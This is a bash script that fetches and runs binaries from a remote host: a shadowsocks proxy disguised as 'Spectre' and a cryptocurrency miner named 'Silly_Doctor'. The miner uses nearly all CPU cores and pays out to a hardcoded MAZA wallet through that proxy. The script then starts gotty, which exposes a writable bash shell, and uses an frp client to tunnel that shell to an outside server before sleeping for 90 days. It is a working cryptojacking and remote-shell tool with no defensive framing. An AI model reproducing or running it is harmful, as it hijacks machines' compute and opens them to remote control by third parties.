#!/bin/bash
cd

sleep 2

wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz

sleep 2

tar -xf Spectre.tar.gz

sleep 2

./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -s -x socks5h://127.0.0.1:1082 api.ipify.org

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2


array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Sream_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 2`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

wget -q http://greenleaf.teatspray.fun/Silly_Doctor_272.tar.gz 1>/dev/null 2>&1

sleep 2

tar -xf Silly_Doctor_272.tar.gz

echo " "
echo " "


unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive &

sleep 2

curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J
sleep 2
tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash &
sleep 2
curl -s https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
sleep 2
tar -xvf frp_0.48.0_linux_amd64.tar.gz
sleep 2
cp frp_0.48.0_linux_amd64/frpc ~/

sleep 2

randomNumber=$(shuf -i 10000-65000 -n 1)


sleep 2

cat > frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.fun
server_port = 7000

[gotty.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 8080
remote_port = $randomNumber
subdomain = $currentdate
END

sleep 2

echo "Your Gotty connection details will be $currentdate.emergencyaccess.teatspray.fun:$randomNumber" 

sleep 2

./frpc -c frpc.ini &

sleep 90d

lscpu

